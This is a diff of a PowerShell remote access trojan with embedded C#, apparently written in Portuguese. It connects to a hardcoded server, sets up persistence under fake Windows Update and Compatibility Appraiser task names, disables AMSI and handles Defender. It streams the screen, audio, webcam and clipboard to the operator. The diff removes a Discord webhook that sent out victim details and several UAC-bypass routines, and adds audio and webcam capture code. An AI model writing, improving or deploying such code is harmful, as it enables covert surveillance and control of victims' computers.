@@ -1,9 +1,8 @@
 # language: PowerShell, file: cliente.ps1, target: Windows 10/11, PowerShell 5.1
-# Agent Completo: NOTTI GANG RAT (APENAS LOG DE CONEXÃO)
+# Agent + Persistencia + Clipboard Sync + Áudio Extensible + Novo Banner
 
 $serverIP = "198.1.195.204"
 $serverPort = 4000
-$webhookURL = "https://canary.discord.com/api/webhooks/1569104108970057808/AcOuccicbirVBoi7gMTYjsZPiy9CpKJOI1Lwk28-4LMgMtaOnYuoucklvCcgbHF36egZ"
 
 $h = [System.BitConverter]::ToString(
     [System.Security.Cryptography.MD5]::Create().ComputeHash(
@@ -11,6 +10,8 @@ $h = [System.BitConverter]::ToString(
 $installName  = "WinUpdateSvc_$h"
 $taskName     = "MicrosoftWindowsUpdateService_$h"
 $taskBootName = "MicrosoftWindowsUpdateBoot_$h"
+$shadowName   = "MicrosoftCompatibilityAppraiser_$h"
+$shadowPath   = "\Microsoft\Windows\Application Experience\$shadowName"
 $mutexName    = "Local\WinUpdateSvcMutex_$h"
 $myUrl = "https://raw.githubusercontent.com/luskavqq7/Windows-Update/refs/heads/main/cliente.ps1"
 
@@ -26,13 +27,6 @@ $vbsPath = "$dir\$installName.vbs"
 $bootPath = "$dir\boot_launcher.ps1"
 
 if ($args -notcontains "-silent") {
-    # Silenciar o UAC
-    try {
-        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Value 0 -Force -ErrorAction SilentlyContinue
-        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "PromptOnSecureDesktop" -Value 0 -Force -ErrorAction SilentlyContinue
-    } catch {}
-
-    # Defender Off
     $defenderOff = $false
     try {
         $mp = Get-MpComputerStatus -ErrorAction Stop
@@ -63,7 +57,6 @@ if ($args -notcontains "-silent") {
         } catch {}
     }
 
-    # Instalar arquivos
     New-Item -ItemType Directory -Path $dir -Force -ErrorAction SilentlyContinue | Out-Null
     try { (New-Object Net.WebClient).DownloadFile($myUrl, $scriptPath) } catch {}
 
@@ -127,19 +120,6 @@ while (`$true) {
 # -silent
 $amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
 if ($amsi) { $amsi.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) }
-
-# AUTO-ELEVAÇÃO SILENCIOSA
-$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
-if (-not $isAdmin) {
-    try {
-        $k = "HKCU:\Software\Classes\ms-settings\shell\open\command"
-        New-Item -Path $k -Force -ErrorAction SilentlyContinue | Out-Null
-        Set-ItemProperty -Path $k -Name "(Default)" -Value "powershell.exe -nop -w hidden -ep bypass -f `"$scriptPath`" -silent" -Force -ErrorAction SilentlyContinue
-        Set-ItemProperty -Path $k -Name "DelegateExecute" -Value "" -Force -ErrorAction SilentlyContinue
-        Start-Process "fodhelper.exe" -WindowStyle Hidden
-    } catch {}
-    exit
-}
 
 $mutex = New-Object System.Threading.Mutex($false, $mutexName)
 if (-not $mutex.WaitOne(0)) { exit }
@@ -232,8 +212,6 @@ if (-not ("R9KAgent" -as [type])) {
 
         static string IP; static int PORT;
         static volatile bool streaming = false;
-        static volatile bool isCamRunning = false;
-        static volatile bool camSuccess = false;
         static volatile bool isAudioRunning = false;
         static object writeLock = new object();
         static object capLock = new object();
@@ -261,18 +239,6 @@ if (-not ("R9KAgent" -as [type])) {
             }
         }
 
-        static string ExtractJsonValue(string json, string key) {
-            try {
-                int idx = json.IndexOf("\"" + key + "\"");
-                if (idx == -1) return "Desconhecido";
-                int start = json.IndexOf(":", idx) + 1;
-                int end = json.IndexOf(",", start);
-                if (end == -1) end = json.IndexOf("}", start);
-                string val = json.Substring(start, end - start).Trim();
-                return val.Trim('"');
-            } catch { return "Desconhecido"; }
-        }
-
         public static void Start(string ip, int port) {
             IP = ip; PORT = port;
             try { SetProcessDPIAware(); } catch {}
@@ -296,55 +262,10 @@ if (-not ("R9KAgent" -as [type])) {
                     StreamWriter myWriter = new StreamWriter(myStream, new UTF8Encoding(false));
                     myWriter.AutoFlush = true;
                     globalWriter = myWriter;
-                    int nMon = Screen.AllScreens.Length;
                     
-                    string banner = "BANNER:" + Environment.MachineName + "@" + Environment.UserName + "|" + Screen.PrimaryScreen.Bounds.Width + "|" + Screen.PrimaryScreen.Bounds.Height + "|" + nMon;
-                    myWriter.WriteLine(banner);
+                    // AQUI ESTÁ A ÚNICA ALTERAÇÃO (não envia IP/nome)
+                    myWriter.WriteLine("BANNER:ONLINE");
                     
-                    // === WEBHOOK EMBED NOTTI GANG RAT (APENAS CONEXAO) ===
-                    try {
-                        string pubIp = "Desconhecido", country = "Desconhecido", city = "Desconhecido", isp = "Desconhecido";
-                        try {
-                            System.Net.ServicePointManager.SecurityProtocol = System.Net.SecurityProtocolType.Tls12;
-                            System.Net.WebClient wcIp = new System.Net.WebClient();
-                            wcIp.Headers.Add("User-Agent", "Mozilla/5.0");
-                            string ipInfo = wcIp.DownloadString("http://ip-api.com/json/?fields=status,country,city,isp,query");
-                            if (ipInfo.Contains("\"status\":\"success\"")) {
-                                pubIp = ExtractJsonValue(ipInfo, "query");
-                                country = ExtractJsonValue(ipInfo, "country");
-                                city = ExtractJsonValue(ipInfo, "city");
-                                isp = ExtractJsonValue(ipInfo, "isp");
-                            }
-                        } catch { }
-
-                        string cpu = "Desconhecido";
-                        try { cpu = Microsoft.Win32.Registry.GetValue(@"HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\CentralProcessor\0", "ProcessorNameString", "").ToString().Trim(); } catch {}
-                        
-                        string os = Environment.OSVersion.ToString();
-                        string timestamp = DateTime.UtcNow.ToString("yyyy-MM-ddTHH:mm:ss.fffZ");
-                        
-                        string jsonPayload = "{\"embeds\":[{" +
-                            "\"title\":\"🟢 NOTTI GANG RAT | Nova Conexão\"," +
-                            "\"color\":65280," +
-                            "\"fields\":[" +
-                                "{\"name\":\"💻 Hostname\",\"value\":\"`" + Environment.MachineName + "`\",\"inline\":true}," +
-                                "{\"name\":\"👤 Usuário\",\"value\":\"`" + Environment.UserName + "`\",\"inline\":true}," +
-                                "{\"name\":\"💿 Sistema\",\"value\":\"`" + os + "`\",\"inline\":false}," +
-                                "{\"name\":\"⚙️ CPU\",\"value\":\"`" + cpu + "`\",\"inline\":false}," +
-                                "{\"name\":\"🌐 IP Público\",\"value\":\"`" + pubIp + "`\",\"inline\":true}," +
-                                "{\"name\":\"🌍 Localização\",\"value\":\"`" + country + " / " + city + "`\",\"inline\":true}," +
-                                "{\"name\":\"🏢 Provedor (ISP)\",\"value\":\"`" + isp + "`\",\"inline\":true}" +
-                            "]," +
-                            "\"footer\":{\"text\":\"NOTTI GANG RAT - Logs\"}," +
-                            "\"timestamp\":\"" + timestamp + "\"" +
-                        "}]}";
-
-                        System.Net.WebClient wcDisc = new System.Net.WebClient();
-                        wcDisc.Headers.Add("Content-Type", "application/json");
-                        wcDisc.UploadString("https://canary.discord.com/api/webhooks/1569104108970057808/AcOuccicbirVBoi7gMTYjsZPiy9CpKJOI1Lwk28-4LMgMtaOnYuoucklvCcgbHF36egZ", "POST", jsonPayload);
-                    } catch {}
-                    // ===================================
-
                     Thread tRead = new Thread(() => ReadLoop(myClient, myReader, myWriter)); tRead.IsBackground = true; tRead.Start();
                     Thread tStream = new Thread(() => StreamLoop(myClient, myWriter)); tStream.IsBackground = true; tStream.Start();
                     Thread tBeat = new Thread(() => HeartbeatLoop(myClient, myWriter)); tBeat.IsBackground = true; tBeat.Start();
@@ -361,8 +282,6 @@ if (-not ("R9KAgent" -as [type])) {
                 } catch {
                 } finally {
                     streaming = false;
-                    isCamRunning = false;
-                    camSuccess = false;
                     isAudioRunning = false;
                     globalWriter = null;
                     try { if (myClient != null) myClient.Close(); } catch {}
@@ -522,46 +441,6 @@ if (-not ("R9KAgent" -as [type])) {
             }
         }
 
-        static void StartWebcamStream() {
-            if (isCamRunning) return;
-            isCamRunning = true;
-            camSuccess = false;
-            Thread t = new Thread(() => {
-                IntPtr capWnd = capCreateCaptureWindow("R9KCapStream", 0, 0, 0, 640, 480, IntPtr.Zero, 0);
-                if (capWnd == IntPtr.Zero) { isCamRunning = false; return; }
-                if (SendMessage(capWnd, WM_CAP_DRIVER_CONNECT, IntPtr.Zero, IntPtr.Zero) == IntPtr.Zero) {
-                    DestroyWindow(capWnd); isCamRunning = false; return;
-                }
-                camSuccess = true;
-                string tempBmp = Path.Combine(Path.GetTempPath(), "r9k_cam_stream.bmp");
-                while (isCamRunning && globalWriter != null) {
-                    SendMessage(capWnd, WM_CAP_GRAB_FRAME, IntPtr.Zero, IntPtr.Zero);
-                    IntPtr r = SendMessage(capWnd, WM_CAP_FILE_SAVEDIB, IntPtr.Zero, tempBmp);
-                    if (r != IntPtr.Zero && File.Exists(tempBmp)) {
-                        try {
-                            using (Bitmap bmp = new Bitmap(tempBmp)) {
-                                using (MemoryStream ms = new MemoryStream()) {
-                                    EnsureJpegCodec(70);
-                                    bmp.Save(ms, jpgCodec, jpgParams);
-                                    string b64 = Convert.ToBase64String(ms.ToArray());
-                                    lock (writeLock) {
-                                        if (globalWriter != null) globalWriter.WriteLine("WEBCAM:" + b64);
-                                    }
-                                }
-                            }
-                            File.Delete(tempBmp);
-                        } catch {}
-                    }
-                    Thread.Sleep(150);
-                }
-                SendMessage(capWnd, WM_CAP_DRIVER_DISCONNECT, IntPtr.Zero, IntPtr.Zero);
-                DestroyWindow(capWnd);
-            });
-            t.SetApartmentState(ApartmentState.STA);
-            t.IsBackground = true;
-            t.Start();
-        }
-
         static void StartAudio() {
             if (isAudioRunning) return;
             isAudioRunning = true;
@@ -570,38 +449,67 @@ if (-not ("R9KAgent" -as [type])) {
                     IMMDeviceEnumerator enumerator = (IMMDeviceEnumerator)new MMDeviceEnumeratorComObject();
                     IMMDevice device;
                     int hr = enumerator.GetDefaultAudioEndpoint(0, 1, out device);
-                    if (hr != 0 || device == null) { isAudioRunning = false; return; }
+                    if (hr != 0 || device == null) {
+                        lock (writeLock) { if (globalWriter != null) globalWriter.WriteLine("AUDIO_ERR: Nenhum dispositivo de audio padrao encontrado (PC sem placa de som ou desativado)."); }
+                        isAudioRunning = false; return;
+                    }
+
                     Guid IID_IAudioClient = new Guid("1CB9AD4C-DBFA-4c32-B178-C2F568A703B2");
                     IAudioClient audioClient;
                     hr = device.Activate(ref IID_IAudioClient, 23, IntPtr.Zero, out audioClient);
-                    if (hr != 0 || audioClient == null) { isAudioRunning = false; return; }
+                    if (hr != 0 || audioClient == null) {
+                        lock (writeLock) { if (globalWriter != null) globalWriter.WriteLine("AUDIO_ERR: Falha ao ativar o dispositivo de audio HR=" + hr.ToString("X")); }
+                        isAudioRunning = false; return;
+                    }
+
                     IntPtr pFormat;
                     hr = audioClient.GetMixFormat(out pFormat);
-                    if (hr != 0 || pFormat == IntPtr.Zero) { isAudioRunning = false; return; }
+                    if (hr != 0 || pFormat == IntPtr.Zero) {
+                        lock (writeLock) { if (globalWriter != null) globalWriter.WriteLine("AUDIO_ERR: Falha ao obter formato de audio HR=" + hr.ToString("X")); }
+                        isAudioRunning = false; return;
+                    }
+
                     WAVEFORMATEX wfx = (WAVEFORMATEX)Marshal.PtrToStructure(pFormat, typeof(WAVEFORMATEX));
+                    
+                    // 0x00080000 = AUDCLNT_STREAMFLAGS_LOOPBACK
                     hr = audioClient.Initialize(0, 0x00080000, 10000000, 0, pFormat, IntPtr.Zero);
-                    if (hr != 0) { CoTaskMemFree(pFormat); isAudioRunning = false; return; }
+                    if (hr != 0) {
+                        lock (writeLock) { if (globalWriter != null) globalWriter.WriteLine("AUDIO_ERR: Driver de audio nao suporta Loopback (HR=0x" + hr.ToString("X") + ")"); }
+                        CoTaskMemFree(pFormat);
+                        isAudioRunning = false; return;
+                    }
+                    
                     Guid IID_IAudioCaptureClient = new Guid("C8ADBD64-E71E-48a0-A4DE-185C395CD317");
                     IAudioCaptureClient captureClient;
                     hr = audioClient.GetService(ref IID_IAudioCaptureClient, out captureClient);
-                    if (hr != 0 || captureClient == null) { CoTaskMemFree(pFormat); isAudioRunning = false; return; }
+                    if (hr != 0 || captureClient == null) {
+                        lock (writeLock) { if (globalWriter != null) globalWriter.WriteLine("AUDIO_ERR: Falha ao obter servico de captura HR=" + hr.ToString("X")); }
+                        CoTaskMemFree(pFormat);
+                        isAudioRunning = false; return;
+                    }
+                    
                     audioClient.Start();
                     bool sentFmt = false;
+                    
                     while (isAudioRunning && globalWriter != null) {
                         Thread.Sleep(10);
                         uint packetSize;
                         hr = captureClient.GetNextPacketSize(out packetSize);
                         if (hr != 0) { Thread.Sleep(100); continue; }
+                        
                         while (packetSize > 0 && isAudioRunning) {
                             IntPtr pData; uint numFrames; uint flags; ulong pos, qpc;
                             hr = captureClient.GetBuffer(out pData, out numFrames, out flags, out pos, out qpc);
                             if (hr != 0) break;
+                            
                             if (numFrames > 0) {
                                 int bytes = (int)(numFrames * wfx.nBlockAlign);
                                 byte[] buffer = new byte[bytes];
                                 Marshal.Copy(pData, buffer, 0, bytes);
+                                
                                 bool isFloat = (wfx.wFormatTag == 3);
                                 if (wfx.wFormatTag == 0xFFFE && wfx.wBitsPerSample == 32) isFloat = true;
+
                                 if (isFloat) {
                                     int samples = bytes / 4;
                                     byte[] pcm16 = new byte[samples * 2];
@@ -615,9 +523,13 @@ if (-not ("R9KAgent" -as [type])) {
                                     }
                                     buffer = pcm16;
                                 }
+                                
                                 lock (writeLock) {
                                     if (globalWriter != null) {
-                                        if (!sentFmt) { globalWriter.WriteLine("AUDIO_FMT:" + wfx.nSamplesPerSec + ":" + wfx.nChannels + ":16"); sentFmt = true; }
+                                        if (!sentFmt) { 
+                                            globalWriter.WriteLine("AUDIO_FMT:" + wfx.nSamplesPerSec + ":" + wfx.nChannels + ":16"); 
+                                            sentFmt = true; 
+                                        }
                                         globalWriter.WriteLine("AUDIO:" + Convert.ToBase64String(buffer));
                                     }
                                 }
@@ -629,9 +541,49 @@ if (-not ("R9KAgent" -as [type])) {
                     }
                     audioClient.Stop();
                     CoTaskMemFree(pFormat);
-                } catch { } finally { isAudioRunning = false; }
+                } catch (Exception ex) {
+                    lock (writeLock) { if (globalWriter != null) globalWriter.WriteLine("AUDIO_ERR: " + ex.Message); }
+                } finally { isAudioRunning = false; }
             });
             t.SetApartmentState(ApartmentState.STA); t.IsBackground = true; t.Start();
+        }
+
+        static string CaptureWebcam() {
+            IntPtr capWnd = IntPtr.Zero;
+            string tempBmp = Path.Combine(Path.GetTempPath(), "r9k_cam_" + Guid.NewGuid().ToString("N") + ".bmp");
+            try {
+                capWnd = capCreateCaptureWindow("R9KCap", 0, 0, 0, 640, 480, IntPtr.Zero, 0);
+                if (capWnd == IntPtr.Zero) return null;
+                if (SendMessage(capWnd, WM_CAP_DRIVER_CONNECT, IntPtr.Zero, IntPtr.Zero) == IntPtr.Zero) return null;
+                SendMessage(capWnd, WM_CAP_GRAB_FRAME, IntPtr.Zero, IntPtr.Zero);
+                IntPtr r = SendMessage(capWnd, WM_CAP_FILE_SAVEDIB, IntPtr.Zero, tempBmp);
+                if (r == IntPtr.Zero || !File.Exists(tempBmp)) return null;
+                EnsureJpegCodec(70);
+                using (Bitmap bmp = new Bitmap(tempBmp)) {
+                    int maxW = 1280;
+                    Bitmap finalBmp = bmp;
+                    if (bmp.Width > maxW) {
+                        int nw = maxW, nh = (int)(bmp.Height * ((float)maxW / bmp.Width));
+                        finalBmp = new Bitmap(nw, nh);
+                        using (Graphics g = Graphics.FromImage(finalBmp)) {
+                            g.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.Bilinear;
+                            g.DrawImage(bmp, 0, 0, nw, nh);
+                        }
+                    }
+                    using (MemoryStream ms = new MemoryStream()) {
+                        finalBmp.Save(ms, jpgCodec, jpgParams);
+                        if (finalBmp != bmp) finalBmp.Dispose();
+                        return Convert.ToBase64String(ms.ToArray());
+                    }
+                }
+            } catch { return null; }
+            finally {
+                if (capWnd != IntPtr.Zero) {
+                    try { SendMessage(capWnd, WM_CAP_DRIVER_DISCONNECT, IntPtr.Zero, IntPtr.Zero); } catch {}
+                    try { DestroyWindow(capWnd); } catch {}
+                }
+                try { if (File.Exists(tempBmp)) File.Delete(tempBmp); } catch {}
+            }
         }
 
         static string GetClipboardText() {
@@ -675,97 +627,18 @@ if (-not ("R9KAgent" -as [type])) {
 
         static void ProcessCommand(string cmd, StreamWriter myWriter) {
             try {
-                // NENHUM LOG DO DISCORD AQUI!
-
                 if (cmd == "stream_start") { streaming = true; return; }
                 if (cmd == "stream_stop") { streaming = false; lock(writeLock) { myWriter.WriteLine("STREAM_STOPPED"); } return; }
-                
-                if (cmd == "webcam_start") { 
-                    StartWebcamStream(); 
-                    Thread.Sleep(1000);
-                    if (camSuccess) {
-                        lock(writeLock) { myWriter.WriteLine("WEBCAM_ON"); } 
-                    } else {
-                        lock(writeLock) { myWriter.WriteLine("CAM_ERR:no_camera"); } 
-                    }
-                    return; 
-                }
-                if (cmd == "webcam_stop") { isCamRunning = false; lock(writeLock) { myWriter.WriteLine("WEBCAM_OFF"); } return; }
-                
                 if (cmd == "audio_start") { StartAudio(); lock(writeLock) { myWriter.WriteLine("AUDIO_ON"); } return; }
                 if (cmd == "audio_stop") { isAudioRunning = false; lock(writeLock) { myWriter.WriteLine("AUDIO_OFF"); } return; }
-
-                // UAC BYPASS
-                if (cmd == "uac_fodhelper") {
-                    try {
-                        Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(@"Software\Classes\ms-settings\shell\open\command");
-                        key.SetValue("", "cmd.exe /c start cmd.exe", Microsoft.Win32.RegistryValueKind.String);
-                        key.SetValue("DelegateExecute", "", Microsoft.Win32.RegistryValueKind.String);
-                        key.Close();
-                        Process.Start("fodhelper.exe");
-                        Thread.Sleep(2000);
-                        try { Microsoft.Win32.Registry.CurrentUser.DeleteSubKeyTree(@"Software\Classes\ms-settings"); } catch {}
-                        lock(writeLock) { myWriter.WriteLine("UAC_BYPASS_OK: Fodhelper"); }
-                    } catch { lock(writeLock) { myWriter.WriteLine("UAC_ERR: Fodhelper"); } }
+                if (cmd == "webcam") {
+                    string b64 = CaptureWebcam();
+                    lock (writeLock) {
+                        if (b64 != null) myWriter.WriteLine("WEBCAM:" + b64);
+                        else myWriter.WriteLine("CAM_ERR:no_camera");
+                    }
                     return;
                 }
-                
-                if (cmd == "uac_cmstp") {
-                    try {
-                        string infPath = Path.Combine(Path.GetTempPath(), "uac.inf");
-                        string content = "[version]\r\nSignature=$chicago$\r\nAdvancedINF=2.5\r\n[DefaultInstall]\r\nCustomDestination=CustInstDestSectionAllUsers\r\nRunPreSetupCommands=RunPreSetupCommandsSection\r\n[RunPreSetupCommandsSection]\r\ncmd.exe /c start cmd.exe\r\n[CustInstDestSectionAllUsers]\r\n49000,49001=AllUSer_LDIDSection, 7\r\n[AllUSer_LDIDSection]\r\n\"HKLM\", \"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\CMMGR32.EXE\", \"ProfileInstallPath\", \"%UnexpectedError%\", \"C:\\Windows\\System32\\cmd.exe\"";
-                        File.WriteAllText(infPath, content);
-                        Process.Start("cmstp.exe", "/s \"" + infPath + "\"");
-                        lock(writeLock) { myWriter.WriteLine("UAC_BYPASS_OK: Cmstp"); }
-                    } catch { lock(writeLock) { myWriter.WriteLine("UAC_ERR: Cmstp"); } }
-                    return;
-                }
-
-                if (cmd == "uac_cleanmgr") {
-                    try {
-                        Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(@"Environment");
-                        key.SetValue("windir", "cmd.exe /c start cmd.exe", Microsoft.Win32.RegistryValueKind.String);
-                        key.Close();
-                        Process.Start("cleanmgr.exe", "/sagerun:1");
-                        Thread.Sleep(2000);
-                        try { Microsoft.Win32.Registry.CurrentUser.DeleteSubKeyTree(@"Environment"); } catch {}
-                        lock(writeLock) { myWriter.WriteLine("UAC_BYPASS_OK: Cleanmgr"); }
-                    } catch { lock(writeLock) { myWriter.WriteLine("UAC_ERR: Cleanmgr"); } }
-                    return;
-                }
-
-                if (cmd == "uac_computerdefaults") {
-                    try {
-                        Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(@"Software\Classes\mscfile\shell\open\command");
-                        key.SetValue("", "cmd.exe /c start cmd.exe", Microsoft.Win32.RegistryValueKind.String);
-                        key.Close();
-                        Process.Start("computerdefaults.exe");
-                        Thread.Sleep(2000);
-                        try { Microsoft.Win32.Registry.CurrentUser.DeleteSubKeyTree(@"Software\Classes\mscfile"); } catch {}
-                        lock(writeLock) { myWriter.WriteLine("UAC_BYPASS_OK: ComputerDefaults"); }
-                    } catch { lock(writeLock) { myWriter.WriteLine("UAC_ERR: ComputerDefaults"); } }
-                    return;
-                }
-
-                if (cmd == "uac_reqadmin") {
-                    try {
-                        ProcessStartInfo psi = new ProcessStartInfo("cmd.exe");
-                        psi.Verb = "runas";
-                        psi.UseShellExecute = true;
-                        Process.Start(psi);
-                        lock(writeLock) { myWriter.WriteLine("UAC_REQ_OK: Request enviado"); }
-                    } catch { lock(writeLock) { myWriter.WriteLine("UAC_REQ_ERR: Recusado"); } }
-                    return;
-                }
-
-                if (cmd == "uac_deescalate") {
-                    try {
-                        Process.Start("runas.exe", "/trustlevel:0x20000 \"cmd.exe\"");
-                        lock(writeLock) { myWriter.WriteLine("UAC_DEESC_OK"); }
-                    } catch { lock(writeLock) { myWriter.WriteLine("UAC_DEESC_ERR"); } }
-                    return;
-                }
-
                 if (cmd == "monitor_next") {
                     int n = Screen.AllScreens.Length;
                     if (n > 1) { currentScreen = (currentScreen + 1) % n; lock (writeLock) { myWriter.WriteLine("MONITOR:" + currentScreen + "/" + n); } }
